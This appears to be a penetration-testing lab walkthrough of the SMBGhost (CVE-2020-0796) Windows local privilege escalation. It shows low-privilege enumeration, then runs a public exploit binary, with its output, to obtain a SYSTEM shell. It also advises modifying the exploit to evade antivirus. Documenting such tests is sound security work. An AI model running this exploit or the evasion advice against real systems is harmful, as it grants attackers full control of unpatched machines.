=======================================================================================================================
Privilege Escalation - SMBGhost exploit (CVE-2020-0796)
=======================================================================================================================

The SMBGhost vulnerability (CVE-2020-0796) is a bug in Windows 10 version 1903/1909's SMB3 compression capability. 


=======================================================================================================================
1. Test of the 'SMBGhost' local privilege escalation vulnerability on a vulnerable Windows 10 
=======================================================================================================================

Link: https://github.com/danigargu/CVE-2020-0796
      Windows SMBv3 LPE Exploit.

=> Important note: The exploit works well but to avoid AV it is needed as usual to make some modifications in the code and recompile it. 


Step 1 - Start a CMD shell as a low-privileged user
====================================================

Microsoft Windows [Version 10.0.18363.418]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\auditor> whoami
desktop-6u70qnd\auditor

C:\Users\auditor> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled


C:\Users\auditor> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
jeff
The command completed successfully.


C:\Users\auditor> systeminfo

Host Name:                 DESKTOP-6U70QND
OS Name:                   Microsoft Windows 10 Home
OS Version:                10.0.18363 N/A Build 18363
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          jeff
Registered Organization:
Product ID:                00326-10000-00000-AA602
Original Install Date:     8/11/2021, 3:41:24 PM
System Boot Time:          8/11/2021, 4:27:29 PM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2195 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              fr;French (France)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,629 MB
Available Physical Memory: 3,090 MB
Virtual Memory: Max Size:  6,165 MB
Virtual Memory: Available: 4,617 MB
Virtual Memory: In Use:    1,548 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\DESKTOP-6U70QND
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB4515871
                           [02]: KB4513661
                           [03]: KB4516115
                           [04]: KB4517245
                           [05]: KB4521863
                           [06]: KB4517389
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.1.254
                                 IP address(es)
                                 [01]: 192.168.1.41
                                 [02]: fe80::b3:b62a:9852:42a8
                                 [03]: 2a01:e34:ec6f:d7e0:5140:8406:bf8e:6c02
                                 [04]: 2a01:e34:ec6f:d7e0:b3:b62a:9852:42a8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.


Step 2 - Upload on the target the exploit (executable file) and run it to obtain a CMD shell as 'nt authority\system'
=======================================================================================================================


C:\Users\Public>cve-2020-0796-local.exe

-= CVE-2020-0796 LPE =-
by @danigargu and @dialluvioso_

Successfully connected socket descriptor: 196
Sending SMB negotiation request...
Finished SMB negotiation
Found kernel token at 0xffffd502c92f7740
Sending compressed buffer...
SEP_TOKEN_PRIVILEGES changed
Injecting shellcode in winlogon...
Success! ;)

C:\Users\Public>


=> A new CMD shell running as 'nt authority\system' pops up !

Microsoft Windows [Version 10.0.18363.418]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
